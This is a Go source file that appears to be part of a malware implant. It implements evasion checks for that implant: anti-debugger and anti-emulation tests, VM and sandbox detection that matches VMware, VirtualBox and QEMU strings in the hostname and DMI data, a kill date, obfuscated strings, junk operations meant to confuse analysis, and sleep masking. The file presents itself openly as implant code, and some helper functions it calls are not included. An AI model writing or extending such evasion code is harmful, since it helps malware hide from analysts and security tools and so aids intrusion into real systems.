package main

import (
	"log"
	"os"
	"runtime"
	"strings"
	"time"
)

// PerformEvasionChecks runs all configured evasion checks
func (i *Implant) PerformEvasionChecks() bool {
	// Add junk operations to confuse analysis
	PolymorphicCode()

	// In persistent mode, only respect kill date but skip other evasion checks
	if PersistentMode {
		// Only check kill date in persistent mode
		if !KillDate.IsZero() && time.Now().After(KillDate) {
			if DebugMode {
				log.Println(deobfStr("kill_date"))
			}
			return false
		}

		// Add simple junk operation to confuse timing analysis
		simpleJunk()
		return true
	}

	if AntiDebug && (IsDebuggerPresent() || AdvancedAntiDebug()) {
		if DebugMode {
			log.Println(deobfStr("debugger_det"))
		}
		return false
	}

	if AntiVM && (IsRunningInVM() || SandboxEvasion()) {
		if DebugMode {
			log.Println(deobfStr("vm_detected"))
		}
		return false
	}

	// Check for process hollowing indicators
	if ProcessHollowing() {
		return false
	}

	// Check for emulation
	if AntiEmulation() {
		return false
	}

	// Check kill date
	if !KillDate.IsZero() && time.Now().After(KillDate) {
		if DebugMode {
			log.Println(deobfStr("kill_date"))
		}
		return false
	}

	// Add simple junk operation to confuse timing analysis
	simpleJunk()

	return true
}

// IsDebuggerPresent checks for debugger presence
func IsDebuggerPresent() bool {
	return isDebuggerPresentImpl()
}

// IsRunningInVM checks for VM indicators
func IsRunningInVM() bool {
	// Check for common VM indicators
	indicators := []string{
		"VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V",
		"vbox", "vmware", "qemu", "parallels",
	}

	// Check system information
	if hostname, err := os.Hostname(); err == nil {
		lower := strings.ToLower(hostname)
		for _, indicator := range indicators {
			if strings.Contains(lower, strings.ToLower(indicator)) {
				return true
			}
		}
	}

	// Check for VM-specific hardware
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile(deobfStr("dmi_path")); err == nil {
			product := strings.ToLower(string(data))
			for _, indicator := range indicators {
				if strings.Contains(product, strings.ToLower(indicator)) {
					return true
				}
			}
		}
	}

	return false
}

// ApplySleepMask implements sleep masking for evasion
func ApplySleepMask(duration time.Duration) {
	if SleepMask {
		// Use enhanced sleep masking with multiple techniques
		EnhancedSleepMask(duration)
	} else {
		time.Sleep(duration)
	}
}
